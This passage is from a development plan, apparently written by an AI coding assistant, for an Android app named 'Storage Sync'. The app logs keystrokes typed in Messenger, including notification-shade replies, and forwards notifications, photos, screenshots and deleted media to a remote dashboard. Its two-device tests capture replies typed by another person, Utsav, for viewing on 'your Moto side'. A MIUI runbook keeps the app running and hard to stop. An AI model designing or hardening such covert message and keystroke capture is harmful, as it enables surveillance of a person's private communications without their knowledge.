Treat "enabled" as only a Settings fact, not proof the system is bound to the service. The 11:14 reply is especially important: it happened while other Messenger typed rows were being captured, so it points to a quick-reply/remote-input visibility gap, not necessarily service death. The later replies happened after all typed events stopped, so they may be service death. The new diagnostics must distinguish these cases instead of guessing.

Add:

- `typed_text_alive_at` updated on every received accessibility event and at least every 60 seconds while the service is connected.
- `typed_events_total`, `typed_text_sent_total`, `typed_placeholder_rejected_total` counters in `AppStatusReporter`.
- A self-test button/action on the setup screen: "Send test typed event". It writes one harmless local event that must appear in dashboard within 5 seconds if both service and server are healthy.
- On `onInterrupt()` / `onDestroy()`, mark the service not alive immediately; on reconnect, force an `AppStatusReporter.report(force = true)`.
- If `typed_text_v2` is off, keep only the stable 8.17.4 behavior: no new focused-node fallback, no blank-field flush.

#### B10. Watchdog and listener-status truthfulness

The installed watchdog is not benign: `ServiceRebindHelper.requestNotificationRebind()` calls `ServiceHealth.markListenerDisconnected()` before every `requestRebind()`, and `SyncForegroundService` calls `rebindIfNeeded()` every 60 seconds. With `notificationListenerConnected` starting false, the loop clears the flag repeatedly even though `onNotificationPosted()` keeps refreshing `lastListenerEventAt`. That is why the two-device window shows `listenerConnected=false` with Messenger notifications still arriving.

Change set B must include these fixes in `BootReceiver.kt` / `ServiceRebindHelper` and `ServiceHealth.kt`:

- `requestNotificationRebind()` must **not** clear `notificationListenerConnected`; only real `onListenerDisconnected()` / `onDestroy()` may mark it false.
- Guard any rebind with `NotificationManager.isNotificationListenerAccessGranted(...)`; if the grant is gone, open notification-access settings and never pretend a rebind can restore permission.
- Call `NotificationListenerService.requestRebind()` only before `onListenerConnected()` or after `onListenerDisconnected()`, as Android documents; do not use it as a general accessibility repair API.
- `onNotificationPosted()` must set a fresh event time and also mark the listener live; a received notification is positive proof of a bound listener.
- After `onListenerConnected()`, reconcile with `getActiveNotifications()`; never call listener operations while disconnected.
- `rebindIfNeeded()` must use `lastListenerEventAt` staleness (>30 minutes) or a real disconnect callback, not the possibly-false in-memory flag alone.
- Add a rebind cooldown so the 60-second loop cannot request a rebind more often than once every 10 minutes.
- Add `watchdog_last_fired_at`, `notification_rebind_total`, `listener_connected`, `listener_last_connected_at`, and `listener_last_disconnected_at` diagnostics to `AppStatusReporter`.
- Keep watchdog work limited to the notification listener, sync service, queue drain, and status report. Never add code that pretends to rebind `TypedTextService`.

### Acceptance test

1. Type in Messenger app → real progressive text captured, final text retained.
2. Reply from notification shade → real text captured, not just `"Type a message…"`.
3. Send quickly (<2.5 s) → final text is still sent before pending is cleared.
4. Placeholder rows no longer appear.
5. `captured_at` is close to the first keystroke, not 2.5+ seconds later.
6. Target shows the contact when available; blank target inherits within 90 minutes.
7. Send `Good morning` both inside Messenger and from the shade; both must appear as typed rows.
8. Two-device replay: from the Moto send `"Uthso properly? Naki arektu ghum?"`, `"Accha"`, a photo, `"Tin ta"`, and a video to the Redmi. Confirm each appears as an incoming notification on the Redmi.
9. Two-device reply test: Utsav replies `"Suya achi"` from the shade and `"Kar Tamzid"` / `"Kal korchilo"` both inside Messenger and from the shade. Every reply must appear as a typed row; the dashboard must not show only your Moto side.
10. Self-test button → typed row appears within 5 seconds; if not, dashboard shows `Text service not alive` within 2 minutes.
11. Force-stop the app or let MIUI restrict it, then reopen it: dashboard must show `typedTextConnected=false` / stale heartbeat until the service actually rebinds; it must not stay falsely green.
12. While notifications are arriving, `listenerConnected` must be true; after a real disconnect it must become false. A watchdog rebind attempt must not clear it by itself.
13. Disable `typed_text_v2`; behavior matches 8.17.4 and no new false rows appear.
14. Toggle the Storage Sync accessibility service OFF, wait 2 seconds, toggle ON: `typedServiceBindTotal` increments and a fresh `typedTextAliveAt` reaches the dashboard within 2 minutes.
15. Clear Recents while Storage Sync is locked: app remains alive, typed service still delivers events, and `typedTextConnected` stays true.
16. With notification access granted but app process killed/reopened, watchdog rebind is attempted only after a real disconnect/stale event and never more than once per 10 minutes.
17. If target/app attribution is uncertain, typed row keeps raw SystemUI label plus `attributionSource=none`/low confidence instead of fabricating a contact or chat app.

---

## 4. Change set C — safer throttling and system noise

### Goal

Keep spam quiet without dropping real messages.

### Client side

Port only these ideas from `android/NotificationForwarderService.kt`:

- `isNoisyProgressOrEphemeral()` — drop exact ephemeral/progress phrases unless terminal phrases like sent/delivered/complete appear
- `shouldSuppressState()` — suppress identical `sbn.key` + content within 1.5 s
- SHA-256 dedup cache within 15 s

Do **not** port:

- the full package blocklist that drops SystemUI, GMS, YouTube, Pinterest, etc.
- the typed-text `length <= 1` placeholder rule
- the typed-text SystemUI block

### Server side already done

Current deployed behavior:

- Android system "Choose input method" → exact phrase block
- Daraz/GMS → identical content 30-min cooldown
- MIUI/Xiaomi → identical content 30-min cooldown plus a 10-min marker cooldown only when title/text contains known system-spam markers
- typed placeholders → exact normalized set

This is intentionally conservative: a normal message from a MIUI/Xiaomi package passes unless it repeats identical content or matches a known system marker.

### Acceptance test

1. Ten different MIUI system notifications with different content must not all be dropped; only marker matches within 10 min are throttled.
2. A real message from a Xiaomi package with no spam marker must be stored.
3. Two identical Daraz/GMS notifications within 30 min → second throttled.
4. `"Type a message…"`, `"Message"`, `"Ask Google"` → ignored.
5. `"r"`, `"ok"`, `"Khao ni ekhono!"` → stored.

---

## 5. Change set D — media completeness

### Goal

Cover images/video frames from public app storage, camera, screenshots, downloads/saves, and local trash/disappearance.

### D1. Screenshot labeling

Files:

- `MC/MediaCaptureManager.kt` constants and `sourceInfoFor()`
- `MC/AllFilesCapture.kt` `sourceFor()`
- `MC/MediaUploader.kt` labels
- dashboard `mediaAction()` / gallery source label

Add path/name markers:

```text
/DCIM/Screenshots/
/Pictures/Screenshots/
Screenshot_
Screenshot-
Screenshot @
```

Set `source = "screenshot"` and label `Screenshot`.

True screenshot-event capture would require user-consented `MediaProjection`; path/name detection is the safe default and works for normal Android/MIUI screenshot locations.

### D2. True owner package

In `MediaCaptureManager.kt:224-236`, add to the MediaStore projection on API 29+:

```kotlin
MediaStore.MediaColumns.OWNER_PACKAGE_NAME
```

Use it before path heuristics:

```text
OWNER_PACKAGE_NAME → path heuristic → shared_app → media_store
```

This improves Messenger/Instagram/Snapchat attribution for public files. Private caches still require Share.

### D3. Downloads SAF periodic poll

Current SAF tree observer can miss events. Add:

- store last SAF poll time in `MediaSettings`
- in `MediaCaptureManager.poll()`, call `DownloadFolderCapture.pollTree(context, since)`
- cadence: every 5 minutes, same as MediaStore/all-files poll
- keep 500-document cap and 24-h manual scan

### D4. Local trash/disappearance

Current local `is_trashed = 1` scan works on API 30+. Add retention-based detection:

- store seen MediaStore IDs/hashes in Room
- on each 5-min scan, if a previously seen local media item disappeared and is not marked archived in app, emit a row with `source = "trash"` and action `photo deleted` / `video deleted`
- keep the existing `is_trashed = 1` path for rename/trash state

Cloud-only Google Photos trash remains impossible to observe locally. Do not claim otherwise.

### D5. Video frames vs original video

Current design uploads intervaled JPEG frames, not the video file. This matches "intervaled frames as earlier discussed".

If real video playback is later required:

- add `video/upload` path in `Cloudinary`
- store `video_url` in `media_captures`
- dashboard `<video>` control in gallery

Not required for the current wording.

### D6. Share-from-app attribution

`EXTRA_REFERRER` is often absent. Add fallback sources where available:

- `Intent.EXTRA_SOURCE_PACKAGE` if present
- `clipData` URI host/authority
- keep `shared_app` fallback

Do not guess a brand from filename alone unless path heuristics are strong.

### D7. Notification-photo media correlation

Implement the receiver side of A6 here:

- Add Room entity `notification_media_intent` and a small DAO method `findOpenIntent(packageName, capturedAt)`.
- Call it from `MediaCaptureManager.scanCollection()`, `AllFilesCapture.scanRecent()/poll()`, and `DownloadFolderCapture.scanRecent()/pollTree()` before uploading a new image.
- On match, pass `relatedNotificationHash` to the media payload and mark the intent `matched`.
- Keep the normal media row even if the notification row no longer exists; correlation is enrichment, not a dependency.
- If `media_owner_v2` is off, skip owner-based matching but keep path-based matching.

### Acceptance test

1. Screenshot → appears as `Screenshot`, not generic image.
2. Camera photo → `camera`.
3. Messenger/Insta/Snap saved image → package/owner label when exposed by MediaStore.
4. Download saved to chosen SAF tree → row appears even if observer event was missed.
5. Local file moved to trash → row appears as `photo trashed` / `photo deleted`.
6. Permanent delete with no local trace → honestly not detectable; document it.
7. Messenger photo notification with no readable notification bytes + locally saved photo → media row carries `relatedNotificationHash` and dashboard links it to the notification.
8. Disable `media_owner_v2`; path-based correlation still works.

---

## 6. Rollout checklist

### 6A. Offline work that can be completed here (Redmi not connected)

1. Create branch from current `main`, then first port the installed uncommitted watchdog/status changes listed in rule 7 of section 0.
2. Apply Room migration and bump version to `81705 / 8.17.5`.
3. Implement change sets A–D in small commits, one feature flag group per commit.
4. Add JVM/local unit tests with synthetic Bundles for:
   - `EXTRA_PICTURE` only
   - MessagingStyle `uri` + `type = image/jpeg`
   - MessagingStyle `uri` that throws `SecurityException`
   - giant bitmap requiring downscale
   - avatar-only large icon with `photoIntent=false`
   - no image at all with `photoIntent=true`
5. Add server contract checks with `curl`/Node for:
   - POST notification with synthetic `imageData` → 201 and non-null `image_url`
   - simulated Cloudinary failure → 503, not 201 with NULL image
   - media POST with `relatedNotificationHash` once section 8 lands
6. Run `./gradlew assembleDebug` and `./gradlew test` locally.
7. Build a signed debug APK with the current signing config but **do not install it anywhere yet**.

### 6B. On-device gates — only after the Redmi Note 10 Pro is connected

8. Back up the current Room DB/export history and keep the installed 8.17.4 APK available for rollback.
9. Install the new debug APK **over** 8.17.4 with the same signing key. Do not uninstall first.
10. Re-open the app once; re-grant only permissions Android resets; confirm all four dashboard health flags are green.
11. Run every acceptance test in sections 2, 3, 4, and 5. Capture dashboard row IDs and diagnostic counters.
12. Specifically confirm:
    - `📷 Sent a photo to you` produces an image, not just text
    - `Good morning` from in-app and shade produce typed rows
    - sender appears as `from <contact>`
    - no avatar is attached to ordinary text rows
    - offline photo queue retries with image
    - typed heartbeat is fresh and `typedTextConnected=true`
    - two-device Moto → Redmi notifications and Redmi → Moto typed replies both appear
    - `listenerConnected=true` while notifications are arriving
    - screenshot/download/trash still work
13. Monitor for 30 minutes: no crashes, no listener disconnect storm, no duplicate rows, no placeholder rows, no runaway SSE/event loop, no watchdog rebind more often than every 10 minutes.
14. Rollback immediately if any of these happen:
    - wrong image attached to a message
    - app crash during notification posting
    - notification listener stays disconnected or `listenerConnected` is false while notifications arrive
    - typed heartbeat stale while typing works, or Settings says enabled while `typedTextConnected=false`
    - image POST loops forever on 409/503
15. If rollback is needed, install 8.17.4 with the same key, disable the offending feature flag if re-testing, and restore DB backup only if rows were corrupted.
16. Only after all on-device gates pass for 24 hours: build release APK with same signing key, install once more, re-verify, then tag the release.

### 6C. MIUI/HyperOS binding repair runbook and 100% acceptance rule

The user has already allowed the known exemptions/permissions/autostart, but the DB still reports `battery_exempt=false`. Therefore the next install must **verify the exact screens** instead of trusting either the user's memory or the app flag. Menu names vary by MIUI/HyperOS version; use Settings search when a label differs. The Redmi Note 10 Pro shipped on MIUI 12/Android 11, so expect older MIUI labels unless the firmware was updated.

Run this in order whenever typed text, accessibility binding, or notification forwarding breaks. Do not skip to the toggle steps while kill causes remain.

| Step | App/screen to open | Exact action | Why |
|---|---|---|---|
| 1 | `Settings → About phone` | Record Android version, MIUI/HyperOS version, and firmware. If Android 13+, continue to step 2; otherwise skip it. | Restricted settings are Android 13+; stock Redmi Note 10 Pro shipped Android 11/MIUI 12. |
| 2 | `Settings → Apps → Manage apps → com.storagesync.debug → ⋮` (or `Settings → Apps → [app] → More`) | Only if an access switch is greyed out: tap **Allow restricted settings**, authenticate, then return. Re-check after every sideloaded APK update. | Google documents this as a user action; allowing it does not itself grant access. |
| 3 | `Settings → Apps → Permissions → Background autostart`; aliases: `Settings → Apps → Manage apps → com.storagesync.debug` or `Security → Permissions → Autostart` | Confirm **Background autostart/Autostart ON** for `com.storagesync.debug`. | Xiaomi warns against disabling autostart for apps relied on for notifications. |
| 4 | `Settings → Apps → Manage apps → com.storagesync.debug → Battery saver/Battery/Power` (or `Settings → Battery → App battery saver`) | Choose **No restrictions**. Turn global Battery saver/Ultra battery saver OFF during repair. Turn **Pause app activity if unused** OFF if present. | Battery controls can kill the app even when permissions remain granted. |
| 5 | Recents screen app card; also `Security → upper-right gear → Boost speed → Lock apps` | Long-press the Storage Sync card and tap the padlock (older MIUI: drag the card down). In Security, set **Lock apps ON** for Storage Sync. Avoid Cleaner/Boost speed and third-party RAM cleaners. | Xiaomi explicitly defines this as protection from one-tap clear-all. |
| 6 | `Settings → Additional settings → Accessibility → Downloaded apps/Downloaded services/Installed services → Storage Sync`; newer builds: `Settings → Accessibility → Storage Sync` | Tap the service. If ON, turn **OFF**, wait 2 seconds, turn **ON**. If OFF, just turn ON. On Xiaomi's Danger dialog, wait for the countdown, tick **I am aware of the possible risks**, tap **OK**. | Android starts an AccessibilityService only through the user's Settings action; OFF→ON is the practical rebind step when a switch reads ON but the binder is dead. |
| 7 | `Settings → Security & privacy → More security & privacy → Special permissions → Device & app notifications → com.storagesync.debug`; aliases: `Settings → Apps → Special app access → Device & app notifications`, older `Notification use rights` | Turn **Allow notification access OFF**, wait 2 seconds, turn **ON**, complete the countdown, tick the risk checkbox, tap **OK**. Do not confuse this with `Settings → Notifications & status bar → App notifications`. | Xiaomi documents this permission path; listener-specific reports show OFF→ON restores callbacks when access still appears granted. |
| 8 | Open the Storage Sync app itself, then a chat app | Reopen Storage Sync once and check its status screen/log. Then open Messenger and type in the **in-app composer**; next reply from the **notification shade**. Lock the screen 10–15 minutes and re-check the dashboard. | App-side counters beat settings chips; shade replies are owned by SystemUI. |
| 9 | Force-stop/reopen, then one reboot; repeat steps 6–8 | Use only if toggles read ON but callbacks are still dead. If still failing, capture `adb shell settings get secure accessibility_enabled`, `adb shell settings get secure enabled_accessibility_services`, `adb shell dumpsys accessibility`, and running-service state; mark status **unverified**, not repaired. | Some HyperOS/MIUI builds can show enabled services with `crashed services`/no live binding where toggling alone does not recover. |

**100% MIUI acceptance gate:** the exact Redmi Note 10 Pro firmware + `8.17.5` signed build is certified only when all of the following pass on-device:

| Gate | Pass condition |
|---|---|
| Accessibility bind | After step 6, a fresh `onServiceConnected()` is counted, `typedServiceBindTotal` increments, and `typedTextAliveAt` reaches the dashboard within 2 minutes. |
| Accessibility liveness | After screen-off for 10–15 minutes and after Recents clear-all with the app locked, accessibility events keep arriving and `getWindows()`/`getRootInActiveWindow()` succeeds. |
| Notification listener bind | `isNotificationListenerAccessGranted()` is true, `onListenerConnected()` fires, and `getActiveNotifications()` returns a freshly posted test notification. |
| Notification delivery | A newly posted test notification triggers `onNotificationPosted()` in Storage Sync while also appearing in the shade; shade visibility alone is not accepted. |
| In-app typed text | Messenger in-app composer produces real typed rows with fresh `event_count`/`last_event_ms`. |
| Shade typed text | A shade quick reply produces a raw SystemUI typed event, captured real text, and logical app/target attribution or explicit low-confidence `none`. |
| Two-device flow | Moto → Redmi messages appear as notifications; Redmi → Moto replies appear as typed rows from both in-app and shade paths. |
| Persistence | The same gates pass after a reboot, after a sideloaded APK update, and on both Wi-Fi and mobile data. |
| Fail-closed status | Any stale heartbeat, killed process, or unbound service shows `Text service not alive` / `Text access enabled but service not bound`; no false green status is allowed. |
| No throttling regression | Real MIUI/Xiaomi notifications and short real typed messages are stored; only exact placeholders/spam markers are ignored. |

If any gate fails, the build is not "100% MIUI working" even if every settings toggle is ON. The correct output is the exact failed gate plus the next 6C step to run.

Online basis for this runbook, accessed `2026-11-26`:

- Official Android: https://developer.android.com/reference/android/accessibilityservice/AccessibilityService
- Official Android: https://developer.android.com/reference/android/service/notification/NotificationListenerService
- Official Android: https://developer.android.com/reference/android/app/NotificationManager
- Official Android restricted settings: https://support.google.com/android/answer/12623953?hl=en
- Official Android battery/Doze: https://developer.android.com/training/monitoring-device-state/doze-standby
- Official Xiaomi autostart: https://www.mi.com/global/support/faq/details/KA-507611
- Official Xiaomi background lock: https://www.mi.com/global/support/faq/details/KA-524985/
- Official Xiaomi notification access: https://www.mi.com/my/support/faq/details/KA-484864
- Official Xiaomi older notification-use-rights path: https://www.mi.com/global/support/faq/details/KA-13113
- Vendor accessibility OFF→ON guide: https://skedit.zendesk.com/hc/en-us/articles/360002987032-Accessibility-keeps-turning-off-automatically
- Vendor MIUI/HyperOS settings guide: https://llcloud.app/guides/stop-xiaomi-killing-apps
- Vendor notification-listener guide: https://hyper-bridge.app/docs/permissions/notification-listener
- Community listener rebind report: https://stackoverflow.com/questions/80015281/notificationlistenerservice-stops-receiving-notifications-on-xiaomi-miui-hypero
- AOSP SystemUI remote input source: https://android.googlesource.com/platform/frameworks/base/+/master/packages/SystemUI/src/com/android/systemui/statusbar/policy/RemoteInputView.java

---

## 7. Honest limitations

- If a chat app does not put the sender/body into notification extras, no app can recover it from the notification. The fallback is today's title/text behavior.
- Notification photos are only recoverable when Android/Messenger exposes a real bitmap or a readable `content://` URI, or when the same photo is saved locally and the media-correlation fallback sees it. If none of those exist, no NotificationListenerService can invent the image.
- Large icons are often contact avatars. The plan deliberately refuses to use them as photos unless a `photoIntent` signal is present and the icon does not look like an avatar; this can leave some legitimate photos unattached when the app exposes nothing else.
- Notification-shade quick replies depend on MIUI exposing the remote input as an editable accessibility node. AOSP shows shade replies are SystemUI-owned, so raw `com.android.systemui` is expected and logical app/target must come from notification correlation. A fully hidden custom input still cannot be recovered.
- The 12-hour audit proves a `2h43m55s` typed gap while notifications continued, plus one real SystemUI row (`8133`) and six `Send chat` placeholder rows. These are concrete acceptance cases, not assumptions.
- A watchdog/alarm cannot start or rebind an `AccessibilityService`. If MIUI kills or unbinds text capture while leaving Settings enabled, only the user's OFF→ON/re-grant flow in section 6C can restore it; the new heartbeat exposes this instead of claiming success.
- `battery_exempt=false` in the DB conflicts with the user's statement that exemptions/permissions/autostart are already allowed. Section 6C verifies the phone directly; the plan does not treat either source as proof until the on-device gates pass.
- Permanent deletion and cloud-only Google Photos trash leave no local evidence.
- Private app caches are not readable without Share or root; use the Share sheet.
- "100% MIUI working" is a measured property of one firmware/build pair after section 6C passes. Android and Xiaomi do not provide an app-callable guarantee for bindings, so code cannot claim certainty remotely.
- The Redmi Note 10 Pro is not connected here. Until sections 6B and 6C pass, the plan is a design, not a verified working update.

---

## 8. Deferred server work after this APK

These are small follow-ups, but items 1-4b are **required for the photo/typed-text failsafes and MIUI certainty gates to fully work** and should ship before or with the APK:

1. `notifications`: add `image_source TEXT`, `photo_intent BOOLEAN NOT NULL DEFAULT false`, and `related_notification_hash TEXT`; accept them from the POST body and expose via GET/SSE.
2. `cloudinary.js` / `notifications.js`: if `uploadImage(imageData)` returns `null`, return `503` and do not insert `image_url = NULL`. Log the failure class/message without logging image bytes.
3. `media_captures`: add `related_notification_hash TEXT`; accept it from media POST and expose via GET/SSE. Dashboard renders linked media inline on the notification row when `image_url` is null.
4. `app_status`: add `typed_text_alive_at TIMESTAMPTZ`, `typed_text_last_event_at TIMESTAMPTZ`, `typed_text_connected BOOLEAN`, `typed_service_bind_total BIGINT`, `typed_events_total BIGINT`, `typed_text_sent_total BIGINT`, `typed_placeholder_rejected_total BIGINT`, `typed_service_reconnect_total BIGINT`, `watchdog_last_fired_at TIMESTAMPTZ`, `notification_rebind_total BIGINT`, `listener_last_connected_at TIMESTAMPTZ`, `listener_last_disconnected_at TIMESTAMPTZ`, `notification_images_total BIGINT`, and `notification_images_failed_total BIGINT`; include them in `devices.js`/`appRoles.js` and dashboard chips.
4a. `typed_text`: add `raw_package TEXT`, `raw_app_label TEXT`, `resolved_package TEXT`, `resolved_app_label TEXT`, `attribution_source TEXT`, and `attribution_confidence REAL`; accept them from typed-text POSTs and expose via GET/SSE. Never overwrite raw package/label with inferred values.
4b. Dashboard must show raw SystemUI rows as `System UI (raw)` with an inferred chat label only when `attributionSource` is present; target inherited only from the 90-minute server fallback must be visibly marked low confidence.
5. `typed_text_alive_at` stale → dashboard shows `Text service not alive` within 2 minutes; `accessibilityEnabled=true` with `typed_text_connected=false` → show `Text access enabled but service not bound`.
6. SSE reconnect gap marker in the feed.
7. Optional: accept `chatBody` as a first-class notification field and render it distinctly.
8. Optional: add a private diagnostic endpoint that returns only counters/last error class for the 6B acceptance run; never expose message text or image URLs without the existing API key.
